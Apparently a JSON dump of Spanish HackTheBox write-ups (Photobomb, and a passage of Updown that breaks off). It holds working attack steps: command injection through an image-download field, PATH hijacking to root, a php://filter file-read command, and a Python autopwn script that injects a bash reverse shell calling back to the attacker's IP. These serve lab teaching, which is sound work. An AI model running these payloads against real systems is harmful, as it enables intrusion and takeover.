autopwn.py -i 10.10.10.10 -p 4444 &quot;&quot;&quot;) parser.add_argument(&#39;-i&#39;, &#39;--ip&#39;, required=True, help=&quot;Specified IP to receive the shell&quot;) parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, required=True, help=&quot;Specified PORT to receive the shell&quot;) args = parser.parse_args() print(ascii_title) exploit = Exploit(args) exploit.run() Puedes encontrar el script y sus requerimientos en mi repositorio https://github.com/E1P0TR0" }, { "title": "Hackthebox Writeup Photobomb", "url": "/posts/HTBPhotobomb/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Easy, Information Leakage, Command Injection, Path Hijacking, Python Scripting", "date": "2022-11-02 16:55:16 -0500", "snippet": "Overview Http authentication credentials by Information leak in a server file Command Inyection by unsanitized user input on file download (Foothold) Path Hijacking to remote command execution as a privileged user by a bash script (Privilege Escalation) OS IP Release Date Difficulty Points Linux 10.10.11.182 08 Oct 2022 Easy 20 Antes de empezar verificamos que estamos conectado a la VPN de HTB y tenemos conexión con la máquina:&amp;gt; ping -c1 10.10.11.182PING 10.10.11.182 (10.10.11.182) 56(84) bytes of data.64 bytes from 10.10.11.182: icmp_seq=1 ttl=63 time=102 ms \\______________________ Linux Machine--- 10.10.11.182 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 101.974/101.974/101.974/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationEmpezamos con la fase de reconocimiento haciendo un escaneo de tipo TCP (Transfer Control Protocol) para descubrir los puertos abiertos de la máquina:❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.182Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 17:04 -05Nmap scan report for 10.10.11.182Host is up (0.12s latency).Not shown: 65140 closed tcp ports (reset), 393 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE22/tcp open ssh \\_________________ Secure Shell Protocol80/tcp open http \\_________________ Hypertext Transfer Protocol Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 –open : Escanear solo puertos abiertos -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneoAhora escaneamos más a fondo para enumerar que servicios corren por detrás de los puertos 22(SSH) - 80(HTTP):❯ nmap -p22,80 -sCV 10.10.11.182 -oN open_ports_TCPStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 17:08 -05Nmap scan report for photobomb.htb (10.10.11.182)Host is up (0.10s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux, protocol 2.0)| ssh-hostkey: | 3072 e22473bbfbdf5cb520b66876748ab58d (RSA)| 256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)|_ 256 20e05d8cba71f08c3a1819f24011d29e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Photobomb|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux, CPE: cpe:/o:linux:linux_kernel Explicación de parámetros : -p &amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sCV (Fusión de parámetros -sC -sV) -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapYa que no disponemos de credenciales omitimos el puerto 22 (SSH) y empezamos escaneando el las tecnologias del servicio web en el puerto 80 (HTTP): Usando whatweb❯ whatweb 10.10.11.182http://10.10.11.182 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], RedirectLocation[http://photobomb.htb/], Title[302 Found], nginx[1.18.0]ERROR Opening: http://photobomb.htb/ - no address for photobomb.htb &amp;lt;-- Redirection Si prefieres una herramienta con interfaz mas amigable puedes usar la extensión WappalyzerObservamos que tenemos un código de estado 302 (Moved Temporarily), el cuál es un mensaje de redirección que ocurre cuando el recurso que solicitamos ha sido temporalmente movido a otra ubicaciónEn esta ocasión al intentar ingresar al servicio web http://10.10.11.182 existe una redirección hacia http://photobomb.htb, él cual es un nombre de dominio que usa el sistema Domain Name System (DNS) que nos facilita la búsqueda de cualquier recurso en internet y así no estar escribiendo la dirección ip en cuestiónAdemás, existe una relación con el concepto de Virtual Hosting, el cuál nos permite asociar a una misma dirección ip varios nombres de dominios donde cada uno de estos sea un servicio web completamente diferente a los demás. Para que nosotros podamos acceder a este dominio necesitamos asociarla con su respectiva ip, por ello debemos agregar está información a nuestro archivo del sistema encargado de asociar/resolver/apuntar una ip a un nombre de dominio /etc/hosts : echo &#39;10.10.11.182 photobomb.htb&#39; &amp;gt;&amp;gt; /etc/hosts❯ whatweb 10.10.11.182http://10.10.11.182 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], RedirectLocation[http://photobomb.htb/], Title[302 Found], nginx[1.18.0]http://photobomb.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], Script, Title[Photobomb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]Observamos que ahora podemos resolver de manera correcta el nombre de dominio photobomb.htb y con ello poder enumerar las tecnologías y sus respectivas versiones para inicialmente, a manera general, buscar vulnerabilidades existentesCon el conocimiento previo de las tecnologías procedemos a visualizar la interfaz de la web: Usando el navegador chromiumDe primeras observamos un mensaje de bienvenida y el mensaje To get started, please click here! (the credentials are in your welcome pack) que si hacemos Hoovering sobre el Hyperlink observamos que nos redirige hacia photobomb.htb/printer y justamente nos pide unas credenciales:Ya que nos disponemos de ningun pack de bienvenida, podemos seguir enumerando los recursos que se cargan al entrar a la web: Web Development Tools NetworkObservamos por la pestaña Initiator que uno de los archivos que se cargan al iniciar la página actual (index) es photobomb.js, y relacionando con el mensaje del pack de bienvenida, examinamos su contenido y encontramos lo siguiente: Web Development Tools SourcesVemos que hace un match de nuestras cookies usando expresiones regulares para validar que si tenemos una cookie con el nombre isPhotoBombTechSupport y cualquier valor, entonces se cambiará el Hyperlink que teniamos antes (http://photobomb/printer) a http://pH0t0:b0Mb!@photobomb.htb/printer que es una manera de authenticación por HTTP (lo mismo que poner las credenciales en el cuadro anterior) También podemos crear una cookie isPhotoBombTechSupport=anything, recargar y dirigirnos a /printer Si quieres aprender como usar expresiones regulares te recomiendo está página muy interactiva: https://regexone.comFootholdAhora solo entramos a la ruta /printer y tenemos la siguiente interfaz:Examinando la web sabemos que tiene la funcionalidad de descargar las imágenes de la página. Por ello, siempre que tengamos está funcinalidad de subir o descargar un archivo es importante analizar que el lo que se envía por la petición. Para ello procedemos a interceptar la petición: Usando burpsuite como proxy intermediarioObservamos que en la petición por POST se pasan los parámetros photo, filetype y dimensions. Probando cambiar los valores para apuntar a otro archivo local o cambiar el nombre de los parámetros con el objetivo de generar algún error, obtuve lo siguiente: Este error es parte de una configuración del Framework minimalista Sinatra del lenguaje Ruby que nos sirve para construir aplicaciones web del lado del servidor (backend). Obviamente comparte información sensible que pueden aprovecar los atacantesSolo podemos ver parte del código donde se valida el parametro filetype con la expresión regular ^(png|jpg) lo cúal solo permite como válido cualquier cadena que empiece por png o jpg, lo cúal es bastando peligroso, probemos esto:Validamos la visualización de nuestro input, por ello podemos pensar en la vulnerabilidad de Command Inyection que nos permite como atacante ejecutar comandos en el sistema operativo que por detrás esté usando el input del usuario en funciones como system() o exec(). Para ello hacemos una Prueba de concepto (Proff of concept): Nos ponemos en escucha con tcpdump y pasamos como input una traza ICMP con ping hacia nuestra IP Tienes mas información en Hacktricks sobre la vulnerabilidad Command InyectionYa que tenemos ejecución remota de comandos, solo nos queda inyectar una reverse shell con bash, entrar como el usuario wizard y conseguimos la flag:Ya que tenemos acceso al sistema, repasemos las malas prácticas que nos permitieron el acceso: (1) Exponer en scripts sobre la funcionalidad de la web información sensible como credenciales (file: photobomb.js) (2) No sanitizar correctamente el input del usuario (file: /home/wizard/photobomb/server.rb)# ...if !filetype.match(/^(png|jpg)/) &amp;lt;--- Here (1) halt 500, &#39;Invalid filetype.&#39; end if !dimensions.match(/^[0-9]+x[0-9]+$/) halt 500, &#39;Invalid dimensions.&#39; end case filetype when &#39;png&#39; content_type &#39;image/png&#39; when &#39;jpg&#39; content_type &#39;image/jpeg&#39; end filename = photo.sub(&#39;.jpg&#39;, &#39;&#39;) + &#39;_&#39; + dimensions + &#39;.&#39; + filetype (2) response[&#39;Content-Disposition&#39;] = &quot;attachment; filename=#{filename}&quot; if !File.exists?(&#39;resized_images/&#39; + filename) command = &#39;convert source_images/&#39; + photo + &#39; -resize &#39; + dimensions + &#39; resized_images/&#39; + filename (3) puts &quot;Executing: #{command}&quot; system(command) &amp;lt;--- COMMAND EXECUTION (4) else puts &quot;File already exists.&quot; end# ...Privilege EscalationEmpezamos con una enumeración básica del sistema como usuarios wizard, y rápidamente listando los comandos, con sus respectivos permisos, que podemos ejecutar sudo -l encontramos lo siguiente:wizard@photobomb:~/photobomb$ sudo -lMatching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.shObervamos que podemos ejecutar el binario /opt/cleanup.sh como el usuario root y se asigna los tags SETENV (sirve para asignar variables de entorno) y NOPASSWD (ejecutar el comando sin requerir una contraseña). Veamos el contenido del archivo: file: /opt/cleanup.sh#!/bin/bash. /opt/.bashrccd /home/wizard/photobomb# clean up log filesif [ -s log/photobomb.log ] &amp;amp;&amp;amp; ! [ -L log/photobomb.log ]then /bin/cat log/photobomb.log &amp;gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.logfi# protect the priceless originalsfind source_images -type f -name &#39;*.jpg&#39; -exec chown root:root {} \\;Lo que hace el script es (1) ejecutar el archivo /opt/.bashrc, él cual es un script con configuraciones respecto a la sessión de la terminal cuando un usuario se logea. (2) Luego limpia los logs de la web que anteriormente vulneramos y (3) por último vemos algo interesante, se aplica una búsqueda con el comando find sin usar su ruta absolutaInmediatamente al observar esto se nos viene a la mente la vulnerabilidad Path Hijacking (secuestro de rutas) que nos permite secuestrar las rutas habituales que se definen en la variable de entorno PATH y asignar nuestras propias rutas junto con nuestros archivos maliciososEntonces lo que podemos hacer es crearnos un archivo también llamado find en una ruta determinada (/tmp/.10.1014.155/find) y con el tag SETENV agregar a la variable de entorno PATH nuestra ruta donde se encuentra nuestro archivo malicioso para luego ejecutarlo, conseguir la shell como root y la flag:wizard@photobomb:~/photobomb$ mkdir /tmp/.10.10.14.155wizard@photobomb:~/photobomb$ cat &amp;gt;&amp;gt; /tmp/.10.10.14.155/find#!/bin/bashchmod u+s /bin/bashwizard@photobomb:~/photobomb$ cat /tmp/.10.10.14.155/find wizard@photobomb:~/photobomb$ chmod +x /tmp/.10.10.14.155/find wizard@photobomb:~/photobomb$ ls -l /bin/bash-rwxr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bashwizard@photobomb:~/photobomb$ sudo PATH=/tmp/.10.10.14.155:$PATH /opt/cleanup.shwizard@photobomb:~/photobomb$ ls -l /bin/bash-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bashwizard@photobomb:~/photobomb$ bash -pbash-5.0# whoamirootbash-5.0# find / -name root.txt | xargs ls -l-rw-r----- 1 root root 33 Nov 3 05:54 /root/root.txtPara finalizar hice un script en python para automatizar todo el proceso y conseguir la shell como root:#!/usr/bin/env python3&quot;&quot;&quot;Autopwn Photobomb HTB---------------------Author : MarssDate : 01 Nov, 2022&quot;&quot;&quot;import argparseimport requestsimport signalimport sysimport shleximport subprocessfrom pwn import *# Ctrl + c (function)def signal_handler(signum, frame): sys.exit(&#39;\\n[!] User terminated.&#39;)# Ctrl + c (signal)signal.signal(signal.SIGINT, signal_handler)# Main classclass Exploit: def __init__(self, args): self.target_url = { &#39;10.10.14.182&#39; : &#39;http://photobomb.htb&#39; } self.ip_address = args.ip self.port = args.port def make_request(self, command): try: headers = { &#39;Authorization&#39; : &#39;Basic cEgwdDA6YjBNYiE=&#39;, &#39;Content-Type&#39; : &#39;application/x-www-form-urlencoded&#39; } form_data = { &#39;photo&#39; : &#39;eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg&#39;, &#39;filetype&#39; : f&#39;jpg;{command}&#39;, &#39;dimensions&#39; : &#39;3000x2000&#39; } response = requests.post(self.target_url[&#39;10.10.14.182&#39;] + &#39;/printer&#39;, headers=headers, data=form_data) except Exception as error: sys.exit(&quot;[x] Error: %s&quot; % error) def command_inyection(self, command): self.make_request(command) def run(self): # Post request with command injection with log.progress(&#39;Starting Inyection Attack&#39;) as progress: # (1) Create workstation progress.status(&#39;Creating working directory&#39;) self.command_inyection(f&quot;mkdir /tmp/.{self.ip_address}&quot;) log.info(&#39;Working directory created&#39;) # (2) Create binary with malicious code (reverse shell in bash) progress.status(&#39;Inyecting malicious code into our binary file&#39;) self.command_inyection(f&quot;echo \\&quot;#!/bin/bash\\\\nbash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/{self.ip_address}/{self.port} 0&amp;gt;&amp;amp;1&#39;\\&quot; &amp;gt; /tmp/.{self.ip_address}/find &amp;amp;&amp;amp; chmod +x /tmp/.{self.ip_address}/find&quot;) log.info(f&#39;Binary created: /tmp/.{self.ip_address}/find&#39;) # (3) Listening mode log.info(f&#39;Open port {self.port} to receive root shell (g.e /usr/bin/nc -l {self.port})&#39;) input(&#39;Press ENTER to continue.&#39;) # (4) Execute binary like root to receive shell progress.success(&#39;Getting connection in a few seconds&#39;) self.command_inyection(f&quot;sudo PATH=/tmp/.{self.ip_address}:$PATH /opt/cleanup.sh&quot;) # (5) Removing working directory and binary file log.info(&#39;Removing working directory and files&#39;) self.command_inyection(f&quot;rm -rf /tmp/.{self.ip_address}&quot;)# Main flowif __name__ == &#39;__main__&#39;: ascii_title = &quot;&quot;&quot; __ /\\ |_ _ _ _ |__) |_ _ |_ _ |_ _ _ |_ /--\\ |_| |_ (_) |_) \\)/ | ) | | ) (_) |_ (_) |_) (_) ||| |_) | by marss &quot;&quot;&quot; parser = argparse.ArgumentParser( description=ascii_title, formatter_class=argparse.RawDescriptionHelpFormatter, epilog=&quot;&quot;&quot;Example: autopwn.py -i 10.10.10.10 -p 4444 &quot;&quot;&quot;) parser.add_argument(&#39;-i&#39;, &#39;--ip&#39;, required=True, help=&#39;specified IP to receive the shell&#39;) parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, required=True, help=&#39;specified PORT to receive the shell&#39;) args = parser.parse_args() print(ascii_title) exploit = Exploit(args) exploit.run() Puedes encontrar el script en mi repositorio: https://github.com/E1P0TR0Como último veamos las malas prácticas que nos permitieron escalar privilegios: Asignar a un usuario del sistema la ejecución de comandos como un usuario privilegiado (file: /etc/sudoers.d/photobomb)wizard photobomb = (root) NOPASSWD:SETENV: /opt/cleanup.sh Máss información sobre el archivo sudoers: https://www.digitalocean.com/community/tutorials/how-to-edit-the-sudoers-file Sumando a lo anterior. Usar binarios del sistema sin asignar su ruta absoluta del sistema (file: /opt/cleanup.sh)#...find source_images -type f -name &#39;*.jpg&#39; -exec chown root:root {} \\;" }, { "title": "Hackthebox Writeup Updown", "url": "/posts/HTBUpdown/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Medium, Git, Python, Php, Python Scripting, Bash Scripting", "date": "2022-10-23 15:41:16 -0500", "snippet": "Overwiew Access to development page by information leak in git repository Remote execution of commands by access to the upload of .phar files Remote execution of commands by the obsolete version of python in a program (Foothold) Remote execution of commands by deprecated program to install packages in python (Privilege Escalation) OS IP Release Date Difficulty Points Linux 10.10.11.177 03 Sep 2022 Medium 30 Antes de empezar verificamos que estamos conectado a la VPN de HTB y tenemos conexión con la máquina:&amp;gt; ping -c1 10.10.11.177PING 10.10.11.177 (10.10.11.177) 56(84) bytes of data.64 bytes from 10.10.11.177: icmp_seq=1 ttl=63 time=109 ms \\______________________ Linux Machine--- 10.10.11.177 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0ms \\_________________\\____________________________________ Successful connectionrtt min/avg/max/mdev = 109.239/109.239/109.239/0.000 ms Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquinaEnumerationEmpezamos con la fase de reconocimiento haciendo un escaneo de tipo TCP (Transfer Control Protocol) para descubrir los puertos abiertos de la máquina:❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.177Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 15:53 -05Nmap scan report for 10.10.11.177Host is up (0.11s latency).Not shown: 65288 closed tcp ports (reset), 245 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE22/tcp open ssh \\_________________ Secure Shell Protocol80/tcp open http \\_________________ Hypertext Transfer Protocol Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 –open : Escanear solo puertos abiertos -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneoAhora escaneamos más a fondo para enumerar que servicios corren por detrás de los puertos 22(SSH) - 80(HTTP):Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 16:00 -05Nmap scan report for siteisup.htb (10.10.11.177)Host is up (0.11s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)| 256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)|_ 256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Is my Website up ?|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelYa que no disponemos de credenciales omitimos el puerto 22(SSH) y empezamos enumerando el puerto 80(HTTP): Enumeración de tecnologías con whatweb❯ whatweb 10.10.11.177http://10.10.11.177 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.177], Title[Is my Website up ?], X-UA-Compatible[chrome=1] Si prefieres una herramienta con interfaz mas amigable puedes usar la extensión Wappalyzer Estos escaneos de tecnologías nos sirven para encontrar que aplicaciones/servicios utiliza el servicio web y tener una idea de como se maneja por detrás. También podemos encotrar si su versión en cuestión es vulnerable a diversos ataques web y con ello ahorrarnos tiempo y seguir el paso a la fase de explotaciónComo no encontramos información interesante recurrimos a examinar la interfaz de la web: Interfaz web en navegador chromiumHay una funcionalidad para checkear si una web está activa o caída. De primeras observamos el nombre de dominio siteisup.htb, como hemos visto antes es posible que se aplique el concepto de Virtual Hosting, así que para comprobar eso recurrimos a nuestro archivo del sistema encargado de la resolución de nombres de dominio y direcciones ip /etc/hosts: echo &#39;10.10.11.177 siteisup.htb&#39; &amp;gt;&amp;gt; /etc/hostsSeguimos observando la misma web, así que empezamos aplicando la técnica Web Directory Enumeration para encontrar rutas (directorios/archivos) del servidor web: Enumeración con script de nmap❯ nmap -p80 --script http-enum --script-args http-enum.basepath=/ 10.10.11.177Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 17:29 -05Nmap scan report for 10.10.11.177Host is up (0.10s latency).PORT STATE SERVICE80/tcp open http| http-enum:|_ /dev/: Potentially interesting folderNmap done: 1 IP address (1 host up) scanned in 17.95 secondsEscaneamos la ruta /dev usandola como ruta base:❯ nmap -p80 --script http-enum --script-args http-enum.basepath=/dev 10.10.11.177Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 17:29 -05Nmap scan report for 10.10.11.177Host is up (0.11s latency).PORT STATE SERVICE80/tcp open http| http-enum:|_ /dev/.git/HEAD: Git folderNmap done: 1 IP address (1 host up) scanned in 13.20 secondsOjito, tenemos un folder .git el cuál es un sistema de control de versiones que usan los desarrolladores al momento de hacer un proyecto. Ahora solo descargamos de manera recursiva dicho folder: Descarga de repositorio .git con wget❯ wget -q -r http://10.10.11.177/dev/.git/ Tambien puedes usar la herramienta git-dumper: https://github.com/arthaud/git-dumperYa con la información del repositorio .git empezamos a enumerar y viendo los logs de los commits del proyecto encontramos lo siguiente:❯ git log --oneline010dcc3 (HEAD -&amp;gt; main, origin/main, origin/HEAD) Delete index.phpc8fcc40 Update checker.phpf67efd0 Create checker.phpab9bc16 Update changelog.txt60d2b32 Create admin.phpc1998f8 Add admin panel.35a3801 Update changelog.txt57af03b Create index.php354fe06 Delete .htpasswd8812785 New technique in header to protect our dev vhost. &amp;lt;----- Interesting!bc4ba79 Update .htaccess61e5cc0 Update index.php3d66cd4 Create changelog.txt4fb1927 Create stylesheet.css6f89af7 Create index.php8d1beb1 Create .htpasswd6ddcc7a Create .htaccess Listamos el log específico❯ git show 8812785commit 8812785e31c879261050e72e20f298ae8c43b565Author: Abdou.Y &amp;lt;84577967+ab2pentest@users.noreply.github.com&amp;gt;Date: Wed Oct 20 16:38:54 2021 +0200 New technique in header to protect our dev vhost.diff --git a/.htaccess b/.htaccessindex 44ff240..b317ab5 100644--- a/.htaccess+++ b/.htaccess@@ -2,3 +2,4 @@ SetEnvIfNoCase Special-Dev &quot;only4dev&quot; Required-Header Order Deny,Allow Deny from All Allow from env=Required-HeaderVemos que el cambio se hace en el archivo .htaccess el cuál es un archivo oculto que se utiliza para configurar funciones adicionales para sitios web alojados en el servidor web Apache.En este caso con la expresión SetEnvIfNoCase esta declarando una variable de entorno llamado Required-Header basado en la cabezera Special-Dev que tendrá el valor de only4dev. Luego de ello se usa la expresión Allow para solo permitir el acceso a las peticiones que tengan como cabezera Special-Dev: only4dev (variable de entorno declarada antes) Documentación de la directiva SetEnvIfNoCase: https://httpd.apache.org/docs/2.4/mod/mod_setenvif.html#setenvifnocaseAparte de ello, en la descripción menciona que se usa para proteger el vhost dev, por ello tenemos información de un nuevo dominio y la aplicación del concepto de Virtual Hosting que vimos antes. Entonces agregamos el dominio dev.siteisup.htb a nuestro archivo /etc/hosts y entramos a dicho dominio: No olvides interceptar la petición burpsuite y agregar la cabezera requeridaFootholdTenemos un sitio web con la misma funcionalidad pero que ahora la lista de sitios web deben estar en un archivo para posteriormente subirlo. Probando subir archivos nos damos cuenta que existen restricciones. Sin embargo, tenemos el repositorio .git de este proyecto y podemos enumerar los archivos involucrados: Visualizamos los cambios del proyecto entre commits con git diff❯ git diff...diff --git a/index.php b/index.phpdeleted file mode 100644index 32eeeee..0000000--- a/index.php+++ /dev/null@@ -1,12 +0,0 @@-&amp;lt;b&amp;gt;This is only for developers&amp;lt;/b&amp;gt;-&amp;lt;br&amp;gt;-&amp;lt;a href=&quot;?page=admin&quot;&amp;gt;Admin Panel&amp;lt;/a&amp;gt;-&amp;lt;?php- define(&quot;DIRECTACCESS&quot;,false);- $page=$_GET[&#39;page&#39;];- if($page &amp;amp;&amp;amp; !preg_match(&quot;/bin|usr|home|var|etc/i&quot;,$page)){- include($_GET[&#39;page&#39;] . &quot;.php&quot;);- }else{- include(&quot;checker.php&quot;);- }-?&amp;gt;...Entre todos los archivos este llama la atención ya que es la página principal (index.php) y a primera vista puede ser vulnerable a Local File Inclusion. Lamentablemente contiene las restricciones adecuadas, pero igualmente logramos enumerar archivos .php con su respectivo código de funcionalidad: Usando el wrapper php://filter❯ curl -s &#39;http://dev.siteisup.htb/?page=php://filter/convert.base64-encode/resource=index&#39; -H &#39;Special-Dev: only4dev&#39; | awk &#39;NR==4&#39; | base64 -d&amp;lt;b&amp;gt;This is only for developers&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;a href=&quot;?page=admin&quot;&amp;gt;Admin Panel&amp;lt;/a&amp;gt;&amp;lt;?php define(&quot;DIRECTACCESS&quot;,false); $page=$_GET[&#39;page&#39;]; if($page &amp;amp;&amp;amp; !preg_match(&quot;/bin|usr|home|var|etc/i&quot;,$page)){ include($_GET[&#39;page&#39;] . &quot;.php&quot;); }else{ include(&quot;checker.php&quot;); }?&amp;gt;Observamos que al no especificar por GET el parámetro page, nos incluye el código del archivo checker.php:❯ curl -s &#39;http://dev.siteisup.htb/?page=php://filter/convert.base64-encode/resource=checker&#39; -H &#39;Special-Dev: only4dev&#39; | awk &#39;NR==4&#39; | base64 -d&amp;lt;?phpif(DIRECTACCESS){ die(&quot;Access Denied&quot;);}?&amp;gt;&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&#39;utf-8&#39; /&amp;gt; &amp;lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;chrome=1&quot; /&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;stylesheet.css&quot;&amp;gt; &amp;lt;title&amp;gt;Is my Website up ? (beta version)&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;div id=&quot;header_wrap&quot; class=&quot;outer&quot;&amp;gt; &amp;lt;header class=&quot;inner&quot;&amp;gt; &amp;lt;h1 id=&quot;project_title&quot;&amp;gt;Welcome,&amp;lt;br&amp;gt; Is My Website UP ?&amp;lt;/h1&amp;gt; &amp;lt;h2 id=&quot;project_tagline&quot;&amp;gt;In this version you are able to scan a list of websites !&amp;lt;/h2&amp;gt; &amp;lt;/header&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div id=&quot;main_content_wrap&quot; class=&quot;outer&quot;&amp;gt; &amp;lt;section id=&quot;main_content&quot; class=&quot;inner&quot;&amp;gt; &amp;lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&amp;gt; &amp;lt;label&amp;gt;List of websites to check:&amp;lt;/label&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;input type=&quot;file&quot; name=&quot;file&quot; size=&quot;50&quot;&amp;gt; &amp;lt;input name=&quot;check&quot; type=&quot;submit&quot; value=&quot;Check&quot;&amp;gt; &amp;lt;/form&amp;gt;&amp;lt;?phpfunction isitup($url){ $ch=curl_init(); curl_setopt($ch, CURLOPT_URL, trim($url)); curl_setopt($ch, CURLOPT_USERAGENT, &quot;siteisup.htb beta&quot;); curl_setopt($ch, CURLOPT_HEADER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_TIMEOUT, 30); $f = curl_exec($ch); $header = curl_getinfo($ch); if($f AND $header[&#39;http_code&#39;] == 200){ return array(true,$f); }else{ return false; } curl_close($ch);}if($_POST[&#39;check&#39;]){ # File size must be less than 10kb. if ($_FILES[&#39;file&#39;][&#39;size&#39;] &amp;gt; 10000) { die(&quot;File too large!&quot;); } $file = $_FILES[&#39;file&#39;][&#39;name&#39;]; # Check if extension is allowed. $ext = getExtension($file); if(preg_match(&quot;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&quot;,$ext)){ die(&quot;Extension not allowed!&quot;); } # Create directory to upload our file. $dir = &quot;uploads/&quot;.md5(time()).&quot;/&quot;; if(!is_dir($dir)){ mkdir($dir, 0770, true); } # Upload the file. $final_path = $dir.$file; move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;{$final_path}&quot;); # Read the uploaded file. $websites = explode(&quot;\\n&quot;,file_get_contents($final_path)); foreach($websites as $site){ $site=trim($site); if(!preg_match(&quot;#file://#i&quot;,$site) &amp;amp;&amp;amp; !preg_match(&quot;#data://#i&quot;,$site) &amp;amp;&amp;amp; !preg_match(&quot;#ftp://#i&quot;,$site)){ $check=isitup($site); if($check){ echo &quot;&amp;lt;center&amp;gt;{$site}&amp;lt;br&amp;gt;&amp;lt;font color=&#39;green&#39;&amp;gt;is up ^_^&amp;lt;/font&amp;gt;&amp;lt;/center&amp;gt;&quot;; }else{ echo &quot;&amp;lt;center&amp;gt;{$site}&amp;lt;br&amp;gt;&amp;lt;font color=&#39;red&#39;&amp;gt;seems to be down :(&amp;lt;/font&amp;gt;&amp;lt;/center&amp;gt;&quot;; } }else{ echo &quot;&amp;lt;center&amp;gt;&amp;lt;font color=&#39;red&#39;&amp;gt;Hacking attempt was detected !&amp;lt;/font&amp;gt;&amp;lt;/center&amp;gt;&quot;; } } # Delete the uploaded file. @unlink($final_path);}function getExtension($file) { $extension = strrpos($file,&quot;.&quot;); return ($extension===false) ? &quot;&quot; : 